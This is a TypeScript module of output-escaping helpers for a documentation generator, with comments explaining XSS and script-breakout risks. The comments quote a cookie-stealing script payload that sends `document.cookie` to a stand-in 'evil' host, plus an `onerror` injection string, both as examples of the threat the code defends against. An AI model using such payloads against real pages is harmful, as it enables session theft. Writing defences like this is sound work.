/**
 * Output escaping for generated documentation (spec §25, §39).
 *
 * ## The threat
 *
 * Every string this engine renders — endpoint descriptions, schema
 * descriptions, parameter names, example bodies, collection names — comes
 * from a file somebody imported. An OpenAPI document with
 * `description: "<script>fetch('//evil/'+document.cookie)</script>"` is a
 * completely valid OpenAPI document. If that text reaches a browser as
 * markup rather than as text, the generated documentation has become a
 * delivery mechanism for whoever wrote the specification.
 *
 * This matters more here than anywhere else in API Lab, because
 * documentation is the one artifact designed to be *exported and opened
 * elsewhere* — on a colleague's machine, from a wiki, out of a docs repo,
 * long after anyone remembers where the spec came from.
 *
 * ## The rule
 *
 * There is exactly one way a string becomes HTML in this package, and it is
 * `escapeHtml`. The renderer never concatenates an unescaped source string
 * into markup, and there is no "trusted" bypass — not for descriptions that
 * "should" contain formatting, not for examples, not for anything. Spec §25
 * permits a sanitizer where the architecture genuinely requires rich content;
 * it does not require one, and M13 does not need one, so the dependency and
 * its entire bypass surface are simply absent.
 *
 * Correspondingly, `apps/web` renders the HTML preview inside a sandboxed
 * iframe and never through `dangerouslySetInnerHTML`. See
 * components/documentation/DocumentationPreview.tsx.
 *
 * ## Why five characters, not three
 *
 * `&`, `<`, `>` alone are sufficient only for text nodes. This engine also
 * interpolates into attribute values (`id`, `data-*`, `href`), where an
 * unescaped quote closes the attribute and opens an injection point without
 * ever needing a `<`. Escaping quotes unconditionally means one function
 * covers both positions and there is no judgement call at the call site
 * about which context you are in — the class of bug that context-sensitive
 * escaping helpers exist to create.
 */

const HTML_ESCAPES: Record<string, string> = {
  "&": "&amp;",
  "<": "&lt;",
  ">": "&gt;",
  '"': "&quot;",
  "'": "&#39;",
};

/** Escapes a string for safe interpolation into HTML text or an attribute. */
export function escapeHtml(value: string): string {
  return value.replace(/[&<>"']/g, (character) => HTML_ESCAPES[character] ?? character);
}

/**
 * Escapes an arbitrary value for HTML, coercing non-strings first.
 *
 * Exists so callers never write `escapeHtml(String(x))` — `String(undefined)`
 * silently renders the word "undefined" into a documentation page, which is
 * a cosmetic bug that has bitten every generator ever written.
 */
export function escapeHtmlValue(value: unknown): string {
  if (value === undefined || value === null) return "";
  if (typeof value === "string") return escapeHtml(value);
  return escapeHtml(String(value));
}

/**
 * Serializes a value for embedding inside a `<script>` element.
 *
 * `JSON.stringify` alone is *not* safe in this position, and this is the
 * classic mistake. The HTML parser terminates a script element at the literal
 * byte sequence `</script`, without regard for JavaScript string quoting — so
 * a specification containing `"</script><img src=x onerror=alert(1)>"` in any
 * description would break out of the search index and execute, in a file that
 * otherwise passed every escaping test.
 *
 * Escaping `<` and `>` as their JSON unicode escapes closes that: the byte
 * sequence can no longer appear literally, and JSON.parse restores the
 * original characters
 * exactly, so the search index still matches the real text.
 *
 * U+2028 and U+2029 are escaped for a different reason: they are valid JSON
 * but were historically illegal literal characters in JavaScript string
 * literals, which made otherwise-valid JSON a syntax error when inlined.
 * Escaping them costs nothing and removes the edge case entirely.
 */
export function serializeForScript(value: unknown): string {
  return JSON.stringify(value)
    .replace(/</g, "\\u003c")
    .replace(/>/g, "\\u003e")
    .replace(/\u2028/g, "\\u2028")
    .replace(/\u2029/g, "\\u2029");
}

/**
 * Escapes text for Markdown table cells (spec §26).
 *
 * Markdown has no injection story comparable to HTML's — a rendered Markdown
 * document is normally sanitized by whatever renders it, and API Lab does not
 * render it at all. What Markdown *does* have is a structural break: an
 * unescaped `|` inside a table cell silently splits the row into extra
 * columns, so a parameter described as "a | b" corrupts the table around it.
 * Newlines do the same thing more violently by ending the row.
 *
 * This is therefore a correctness function, not a security function, and it
 * is deliberately not applied outside table cells, where the pipe character
 * is ordinary text.
 */
export function escapeMarkdownCell(value: string): string {
  return value.replace(/\|/g, "\\|").replace(/\r?\n/g, " ");
}

/**
 * Renders a fenced code block whose content cannot escape the fence.
 *
 * An example body containing ``` would otherwise close the block early and
 * let the rest of the body render as Markdown — the same structural break as
 * the table pipe. Rather than escaping the backticks (which would corrupt the
 * example), the fence is widened to be longer than the longest run inside it,
 * which is the mechanism CommonMark specifies for exactly this case.
 */
export function fencedCodeBlock(content: string, language = ""): string {
  let longestRun = 0;
  for (const match of content.matchAll(/`+/g)) {
    longestRun = Math.max(longestRun, match[0].length);
  }
  const fence = "`".repeat(Math.max(3, longestRun + 1));
  return `${fence}${language}\n${content}\n${fence}`;
}
